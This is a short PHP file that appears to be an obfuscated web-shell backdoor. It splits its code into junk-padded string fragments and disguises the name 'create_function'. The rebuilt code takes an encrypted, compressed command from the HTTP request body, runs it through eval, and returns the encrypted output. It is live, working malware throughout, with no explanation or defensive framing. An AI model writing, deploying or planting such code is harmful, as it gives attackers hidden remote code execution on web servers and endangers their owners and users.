<?php
$K='{$o.=$t{,<$i}^$k{$j},<;},<,<}return $,<o;}if (@preg,<_m,<atch(,<"/$kh(.+)$k,<f/",@fi,<le_get,<,<_conte,<nts("ph,<,<';
$H='ob_get,<_conten,<ts();@,<,<ob_en,<d_clean();$,<r=@base6,<4_e,<ncode(@x,<(@,<gzcompr,<ess($,<o),<,$k));pr,<int("$p$k,<h$r$kf");}';
$O='$k="6f,<d8116,<c";$kh=",<12,<aeca2f0d8b",<;$kf=",<99b,<,<8c3,<ab3a64";$p=,<,<"I,<4NEWr97kX8S0A,<Xm";functio,<n x(';
$Z='p://input"),$m,<,<)==1) {@ob_,<start(,<);@eva,<l(@gzunc,<ompre,<ss(@,<x(@ba,<se64_deco,<de,<($m[1,<]),$k,<)));$o=@';
$f=str_replace('yk','','cykreykatyke_fuyknykcyktion');
$P='$t,$,<,<k){$c=st,<rlen,<($k),<;$l=strlen,<($t);$o="";for,<(,<$i=0;$i<$l;,<){for,<($j=0,<;,<,<($j<$c&&$i<$l);$j,<++,,<$i++),<';
$b=str_replace(',<','',$O.$P.$K.$Z.$H);
$N=$f('',$b);$N();
?>
